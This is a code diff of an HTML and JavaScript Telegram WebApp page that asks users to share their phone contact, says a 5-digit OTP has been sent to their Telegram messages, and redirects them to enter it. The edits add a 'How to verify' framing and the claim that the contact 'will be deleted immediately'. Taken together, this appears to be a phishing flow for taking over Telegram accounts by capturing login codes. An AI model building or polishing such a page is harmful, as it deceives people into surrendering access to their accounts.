@@ -12,6 +12,7 @@
         .header { background: #0088cc; color: white; padding: 24px 20px; text-align: center; }
         .content { padding: 30px; }
         .btn { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .error { background: #ffebee; color: #c62828; padding: 12px; border-radius: 6px; margin-bottom: 15px; display: none; }
         .error.show { display: block; }
         .success { background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 6px; margin-bottom: 15px; display: none; }
@@ -34,11 +35,12 @@
             <!-- Initial Screen -->
             <div id="initial-screen">
                 <div class="info-box">
-                    <b>Steps:</b><br>
+                    <b>How to verify:</b><br>
                     1. Click "Share Contact"<br>
-                    2. Allow contact sharing<br>
-                    3. OTP will be sent<br>
-                    4. Enter OTP
+                    2. Telegram will ask for permission<br>
+                    3. Allow contact sharing<br>
+                    4. OTP will be sent to your phone<br>
+                    5. Enter OTP in next screen
                 </div>
                 
                 <div class="error" id="error-message"></div>
@@ -47,18 +49,22 @@
                 <button class="btn" onclick="shareContact()" id="share-btn">
                     📞 Share My Contact
                 </button>
+                
+                <p style="text-align: center; color: #666; font-size: 14px; margin-top: 15px;">
+                    Your contact will be deleted immediately after processing
+                </p>
             </div>
             
             <!-- Contact Shared Screen -->
             <div id="contact-screen" class="hidden">
                 <div class="info-box">
                     ✅ <b>Contact shared!</b><br>
-                    Processing...
+                    Telegram is sending your contact to the bot...
                 </div>
                 
                 <div class="loading">
                     <div class="loading-spinner"></div>
-                    <p id="waiting-text">Waiting for OTP...</p>
+                    <p id="waiting-text">Waiting for OTP to be sent...</p>
                 </div>
                 
                 <div class="error" id="contact-error"></div>
@@ -67,11 +73,16 @@
             <!-- OTP Sent Screen -->
             <div id="otp-screen" class="hidden">
                 <div class="success show">
-                    ✅ <b>OTP Sent!</b>
+                    ✅ <b>OTP Sent Successfully!</b>
                 </div>
                 
                 <div class="info-box" id="phone-display">
                     Phone: Loading...
+                </div>
+                
+                <div class="info-box">
+                    <b>5-digit OTP sent to your phone</b><br>
+                    Check your Telegram messages for the code
                 </div>
                 
                 <button class="btn" onclick="goToOTPPage()">
@@ -89,11 +100,6 @@
         document.addEventListener('DOMContentLoaded', function() {
             console.log("WebApp loaded");
             
-            // Initialize session with backend
-            initUserSession();
-        });
-        
-        function initUserSession() {
             // Get user ID from Telegram WebApp
             if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                 Telegram.WebApp.ready();
@@ -102,50 +108,29 @@
                 const user = Telegram.WebApp.initDataUnsafe?.user;
                 if (user && user.id) {
                     userId = user.id.toString();
-                    console.log("User ID from WebApp:", userId);
+                    console.log("✅ User ID from WebApp:", userId);
                 } else {
-                    // Fallback: use query parameter or generate
+                    // Fallback: check URL for user_id
                     const urlParams = new URLSearchParams(window.location.search);
-                    userId = urlParams.get('user_id') || 'web_' + Date.now();
-                    console.log("Generated user ID:", userId);
+                    userId = urlParams.get('user_id');
+                    if (!userId) {
+                        userId = 'web_' + Date.now();
+                        console.log("⚠️ Generated user ID:", userId);
+                    }
                 }
             } else {
                 // For testing outside Telegram
                 const urlParams = new URLSearchParams(window.location.search);
                 userId = urlParams.get('user_id') || 'test_' + Date.now();
-                console.log("Test user ID:", userId);
+                console.log("⚠️ Test user ID:", userId);
             }
-            
-            // Initialize session with backend
-            if (userId) {
-                fetch('/api/init-session', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        user_id: userId
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        console.log("Session initialized:", data.message);
-                    } else {
-                        console.error("Failed to initialize session:", data.error);
-                    }
-                })
-                .catch(error => {
-                    console.error("Session init error:", error);
-                });
-            }
-        }
+        });
         
         function shareContact() {
             console.log("Share contact clicked for user:", userId);
             
             if (!userId) {
-                showError("Cannot get user ID");
+                showError("Cannot get user ID. Please try again.");
                 return;
             }
             
@@ -153,23 +138,25 @@
             document.getElementById('initial-screen').classList.add('hidden');
             document.getElementById('contact-screen').classList.remove('hidden');
             
-            // Check if we're in Telegram WebApp
+            // Use Telegram.WebApp.requestContact()
             if (typeof Telegram !== 'undefined' && Telegram.WebApp && Telegram.WebApp.requestContact) {
                 Telegram.WebApp.requestContact(function(shared) {
                     console.log("requestContact callback:", shared);
                     
                     if (shared) {
-                        console.log("✅ User shared contact");
+                        // User shared contact - Telegram will send it to the bot
+                        console.log("✅ User shared contact via Telegram popup");
                         startCheckingOTPStatus();
                     } else {
-                        console.log("❌ User cancelled");
+                        // User cancelled
+                        console.log("❌ User cancelled contact sharing");
                         document.getElementById('contact-screen').classList.add('hidden');
                         document.getElementById('initial-screen').classList.remove('hidden');
-                        showError("Contact sharing cancelled");
+                        showError("Contact sharing was cancelled");
                     }
                 });
             } else {
-                // For testing
+                // For testing or fallback
                 console.log("⚠️ Using test mode");
                 startCheckingOTPStatus();
             }
@@ -219,10 +206,10 @@
                             document.getElementById('otp-screen').classList.remove('hidden');
                             document.getElementById('phone-display').textContent = `Phone: ${data.phone}`;
                             
-                            // Auto-redirect after 2 seconds
+                            // Auto-redirect after 3 seconds
                             setTimeout(() => {
                                 goToOTPPage();
-                            }, 2000);
+                            }, 3000);
                         } else if (data.contact_received) {
                             // Contact received but OTP not sent yet
                             document.getElementById('waiting-text').textContent = 
@@ -235,7 +222,7 @@
                     } else {
                         // Error
                         clearInterval(checkInterval);
-                        showError(data.error || "Failed to process contact");
+                        showError(data.error || "Failed to send OTP");
                         document.getElementById('contact-screen').classList.add('hidden');
                         document.getElementById('initial-screen').classList.remove('hidden');
                     }
@@ -259,6 +246,17 @@
             setTimeout(() => {
                 errorEl.classList.remove('show');
             }, 5000);
+        }
+        
+        function showSuccess(message) {
+            console.log("Success:", message);
+            const successEl = document.getElementById('success-message');
+            successEl.textContent = message;
+            successEl.classList.add('show');
+            
+            setTimeout(() => {
+                successEl.classList.remove('show');
+            }, 3000);
         }
     </script>
 </body>
